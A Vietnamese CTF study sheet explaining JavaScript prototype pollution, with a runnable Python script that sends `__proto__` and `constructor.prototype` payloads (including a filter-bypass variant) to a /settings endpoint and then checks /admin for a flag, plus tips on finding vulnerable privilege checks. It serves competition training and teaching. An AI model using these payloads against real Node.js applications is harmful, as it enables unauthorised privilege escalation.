# Prototype Pollution (sửa "khuôn mẫu chung", ảnh hưởng mọi object)

Đây là lỗi đặc thù của JavaScript/Node.js. Trong JavaScript, hầu như mọi object (`{}`) đều "mượn" thuộc tính từ 1 object gốc dùng chung, gọi là prototype (khuôn mẫu cha) — nếu object của bạn không có thuộc tính nào đó, JavaScript tự động tra lên khuôn mẫu chung đó để tìm. Thuộc tính đặc biệt tên `__proto__` cho phép bạn sửa trực tiếp vào khuôn mẫu chung này. Nếu code của server có hàm "trộn" (merge) 2 object vào nhau mà không kiểm tra, và bạn gửi lên 1 key tên `__proto__`, bạn không chỉ sửa 1 object của riêng mình — bạn sửa luôn khuôn mẫu chung mà MỌI object khác trong toàn bộ chương trình đang dùng, kể cả object được tạo ra ở phần code hoàn toàn khác, sau này.

Trên Burp bạn nhận ra lỗi này khi: app Node.js có endpoint nhận JSON lồng nhiều cấp (cập nhật settings/profile) — bạn gửi `{"__proto__": {"polluted": "yes"}}` vào đó, rồi gọi 1 endpoint HOÀN TOÀN KHÁC (ví dụ tạo object user mới), và endpoint đó bất ngờ "có" field `polluted` dù chưa từng nhận field này trong request của chính nó.

## Snippet copy-là-chạy

```python
import requests

# Vài biến thể payload -- thử lần lượt nếu cái đầu bị lọc
POLLUTION_PAYLOADS = [
    {"__proto__": {"isAdmin": True}},
    {"constructor": {"prototype": {"isAdmin": True}}},
    {"a": {"__proto__": {"isAdmin": True}}},  # lồng sâu hơn, phòng khi app chỉ lọc cấp ngoài
]


def solve_one(session, base_url):
    # Bước 1: gửi payload ô nhiễm qua MỘT endpoint merge bất kỳ (ở đây giả sử là /settings)
    # Thử từng biến thể cho tới khi 1 cái "ăn"
    for payload in POLLUTION_PAYLOADS:
        session.post(f"{base_url}/settings", json=payload, timeout=5)

        # Bước 2: kiểm tra ảnh hưởng ở MỘT ENDPOINT KHÁC (không phải /settings)
        # Lưu ý: pollution không hiện ra trong Response của chính request bước 1,
        # phải kiểm tra gián tiếp qua hành vi của endpoint khác
        r = session.get(f"{base_url}/admin", timeout=5)
        if r.status_code == 200 and "FHACKER2026{" in r.text:
            return r.text

    return None


if __name__ == "__main__":
    s = requests.Session()
    s.verify = False
    print(solve_one(s, "http://target"))
```

## Giải thích cho người mới

- Khác hẳn các lỗi khác: bạn gửi payload ở 1 endpoint (bước 1: `/settings`), nhưng phải đi kiểm tra kết quả ở 1 endpoint KHÁC (bước 2: `/admin`) — vì bản chất lỗi này là sửa "cái chung" dùng ở nhiều nơi, không phải sửa dữ liệu riêng của request đó.
- Vòng `for payload in POLLUTION_PAYLOADS`: nếu server lọc đúng chuỗi `__proto__`, bạn thử cách khác đi tới cùng đích là `constructor.prototype` — 2 cách viết khác nhau trong JavaScript nhưng cùng chạm vào khuôn mẫu gốc.
- Pollution chỉ tồn tại trong bộ nhớ (RAM) của process server đang chạy — nếu server restart (ví dụ ban tổ chức reset đầu round), ô nhiễm bị mất sạch, phải gửi lại payload bước 1 trước mỗi lần gọi bước 2 trong 1 round mới. Script trên đã làm đúng thứ tự "gửi payload rồi mới kiểm tra" mỗi lần chạy, nên tự nhiên đúng cho cả trường hợp này.
- Nếu không có endpoint kiểm tra admin rõ ràng, vẫn áp dụng ý tưởng: ô nhiễm xong, thử gọi lại BẤT KỲ chức năng nào có kiểm tra quyền kiểu `if (user.isAdmin)` trong code — vì field đó giờ "tự nhiên" có giá trị `true` trên mọi object, dù route đó chưa từng đặt field này.

## Lưu ý nhanh

- Chỉ áp dụng cho app chạy Node.js/JavaScript phía server — không có khái niệm prototype chain kiểu này ở Python/PHP/Java.
- Không bao giờ thấy pollution "hiện" ngay trong Response của request gửi payload — luôn phải gọi sang endpoint/chức năng khác để quan sát ảnh hưởng.
- Nếu route kiểm tra quyền dùng `hasOwnProperty()` (chỉ kiểm tra thuộc tính nằm trực tiếp trên object, bỏ qua khuôn mẫu cha), route đó sẽ không bị ảnh hưởng — thử tìm route/chức năng khác không dùng cách kiểm tra chặt này.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
